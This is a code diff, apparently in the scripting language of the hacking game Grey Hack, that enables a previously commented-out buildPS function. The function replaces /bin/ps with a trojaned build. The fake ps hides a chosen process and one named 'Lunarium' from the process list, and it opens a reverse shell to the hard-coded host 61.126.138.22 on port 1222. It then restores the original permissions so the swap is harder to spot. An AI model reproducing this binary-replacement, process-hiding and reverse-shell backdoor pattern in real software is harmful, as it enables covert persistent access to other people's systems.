@@ -138,36 +138,36 @@ error=function(reason, command = null)
 	return out
 end function
 
-// buildPS=function(proc)
-// 	if not comp.File("/bin") then return
-// 	ps=comp.show_procs
-// 	source="output = get_shell.host_computer.show_procs;lines=output.split(""\n"");newOut=[];rshell=0;for line in lines;if line.split("" "")[-1] == """+proc+""" then;rshell=1;continue;end if;if line.split("" "")[-1] == ""Lunarium"" then continue;newOut.push(line);end for;mxf=null;root=get_shell.host_computer.File(""/"");newFiles=[];newFiles=newFiles+root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then;newFiles=currFile.get_folders+currFile.get_files+newFiles;end if;test=include_lib(currFile.path);if typeof(test) == ""MetaxploitLib"" then mxf=currFile.path;end while;if mxf then;if not rshell then include_lib(mxf).rshell_client(""61.126.138.22"",1222,"""+proc+""");end if;output=newOut.join(""\n"");print(format_columns(output))"
-// 	comp.touch(xpath,"ps.src")
-// 	p=null
-// 	if comp.File("/bin/ps") then p=comp.File("/bin/ps").permissions[1:]
-// 	src=comp.File(xpath+"/ps.src")
-// 	if not src then return
-// 	src.set_content(source)
-// 	shell.build(src.path,"/bin")
-// 	src.delete
-// 	ps=comp.File("/bin/ps")
-// 	ps.chmod("u-wrx")
-// 	ps.chmod("g-wrx")
-// 	ps.chmod("o-wrx")
-// 	if p then
-// 		up=p[:3].replace("-","")
-// 		gp=p[3:-3].replace("-","")
-// 		op=p[-3:].replace("-","")
-// 	else
-// 		p=comp.File("/bin").permissions[1:]
-// 		up=p[:3].replace("-","")
-// 		gp=p[3:-3].replace("-","")
-// 		op=p[-3:].replace("-","")
-// 	end if
-// 	ps.chmod("u+"+up)
-// 	ps.chmod("g+"+gp)
-// 	ps.chmod("o+"+op)
-// end function
+buildPS=function(proc)
+	if not comp.File("/bin") then return
+	ps=comp.show_procs
+	source="output = get_shell.host_computer.show_procs;lines=output.split(""\n"");newOut=[];rshell=0;for line in lines;if line.split("" "")[-1] == """+proc+""" then;rshell=1;continue;end if;if line.split("" "")[-1] == ""Lunarium"" then continue;newOut.push(line);end for;mxf=null;root=get_shell.host_computer.File(""/"");newFiles=[];newFiles=newFiles+root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then;newFiles=currFile.get_folders+currFile.get_files+newFiles;end if;test=include_lib(currFile.path);if typeof(test) == ""MetaxploitLib"" then mxf=currFile.path;end while;if mxf then;if not rshell then include_lib(mxf).rshell_client(""61.126.138.22"",1222,"""+proc+""");end if;output=newOut.join(""\n"");print(format_columns(output))"
+	comp.touch(xpath,"ps.src")
+	p=null
+	if comp.File("/bin/ps") then p=comp.File("/bin/ps").permissions[1:]
+	src=comp.File(xpath+"/ps.src")
+	if not src then return
+	src.set_content(source)
+	shell.build(src.path,"/bin")
+	src.delete
+	ps=comp.File("/bin/ps")
+	ps.chmod("u-wrx")
+	ps.chmod("g-wrx")
+	ps.chmod("o-wrx")
+	if p then
+		up=p[:3].replace("-","")
+		gp=p[3:-3].replace("-","")
+		op=p[-3:].replace("-","")
+	else
+		p=comp.File("/bin").permissions[1:]
+		up=p[:3].replace("-","")
+		gp=p[3:-3].replace("-","")
+		op=p[-3:].replace("-","")
+	end if
+	ps.chmod("u+"+up)
+	ps.chmod("g+"+gp)
+	ps.chmod("o+"+op)
+end function
 
 buildPS = function(process)
 	return
